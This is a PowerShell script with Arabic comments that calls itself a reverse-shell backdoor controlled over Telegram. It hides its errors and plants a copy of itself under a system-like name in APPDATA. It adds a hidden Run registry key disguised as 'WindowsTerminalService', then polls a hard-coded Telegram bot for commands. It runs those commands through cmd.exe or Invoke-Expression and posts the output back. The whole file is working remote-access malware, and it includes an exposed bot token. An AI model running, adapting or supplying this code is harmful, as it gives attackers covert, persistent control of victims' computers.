# --- [STARK OMEGA: BRIDGE GIANTS-5] ---
# الوظيفة: بوابة تحكم خلفية (Reverse Shell) لتنفيذ الأوامر الحية عبر تليجرام

$ErrorActionPreference = 'SilentlyContinue'

# الثوابت
$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$CHAT_ID = "7393359923"

# آلية البقاء (Persistence) - زرع البوابة في النظام
$path = "$env:APPDATA\Microsoft\Windows\System32_Bridge.ps1"
if (!(Test-Path $path)) {
    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
    $MyContent | Out-File -FilePath $path
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsTerminalService' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
}

function Send-Response($text) {
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = "<b>[BRIDGE OUTPUT]:</b>`n<pre>$text</pre>"; parse_mode = "HTML" }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

# إشعار البدء
Send-Response "⚡ البوابة نشطة الآن. بانتظار الأوامر..."

$lastUpdateId = 0

while($true) {
    try {
        # جلب الرسائل الجديدة من البوت
        $response = Invoke-RestMethod "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$($lastUpdateId + 1)&timeout=30"
        
        foreach ($update in $response.result) {
            $lastUpdateId = $update.update_id
            $msg = $update.message.text
            
            # نمط الأمر المخصص: [cmd: your_command] أو [ps: your_command]
            if ($msg -match "^cmd: ") {
                $command = $msg.Substring(5)
                $output = cmd.exe /c $command 2>&1 | Out-String
                Send-Response $output
            }
            elseif ($msg -match "^ps: ") {
                $command = $msg.Substring(4)
                $output = Invoke-Expression $command 2>&1 | Out-String
                Send-Response $output
            }
        }
    } catch {
        # في حالة فقدان الاتصال، يحاول مرة أخرى بعد 10 ثواني
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds 2
}
